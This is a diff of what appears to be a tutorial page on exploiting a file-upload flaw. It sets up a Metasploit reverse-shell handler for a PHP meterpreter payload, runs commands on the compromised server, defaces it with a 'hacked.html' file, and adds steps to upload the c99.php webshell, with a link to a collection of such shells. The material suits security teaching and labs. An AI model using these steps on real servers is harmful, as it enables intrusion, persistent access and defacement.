@@ -26,11 +26,11 @@ Next we'll use Metasploit to create a service that listens for the connection fr
     msfconsole
     use exploit/multi/handler
     set PAYLOAD php/meterpreter/reverse_tcp
-    set LHOST 192.168.1.141
+    set LHOST 192.168.8.141
     set LPORT 4444
     exploit
 
-    [*] Started reverse handler on 192.168.1.155:4444 
+    [*] Started reverse handler on 192.168.8.141:4444 
     [*] Starting the payload handler...
 
 It is then possible to upload the malicious script to the application and the server.
@@ -45,7 +45,7 @@ After running the script, we can see in the Metasploit console (on the attacker'
 
 ![](../assets/fu05.png)
 
-In this "meterpreter" we can launch a shell on the remote machine and execute several commands there.
+In this "`meterpreter`" we can launch a shell on the remote machine and execute several commands there.
 
     shell
 
@@ -55,8 +55,22 @@ We can execute several commands there, including creating files with messages by
     pwd
     whoami
     w
-    echo "Powned by SOMEONE!" > hacked.html
+    echo "Pwned by SOMEONE!" > hacked.html
 
 At the end we can see that a file "hacked.html" was created on the server.
  
 When we click on that file, we can see the message that was placed there!
+
+Moreover, we might also use this "`meterpreter`" shell, to upload more malicious scripts to the server. We might for instance upload a webshell to the server. We can use the same webshell we've used before - `c99.php`. [Here](https://www.r57shell.net/), you have a collection of such shells.
+
+    upload c99.php
+
+![](../assets/fu06.png)
+
+Then, going back to the web application and looking at the files we have on the upload directory, we can select the `c99.php` script.
+
+![](../assets/fu07.png)
+
+When it is executed, you have access to a shell that allows you to navigate through the system!
+
+![](../assets/fu08.png)
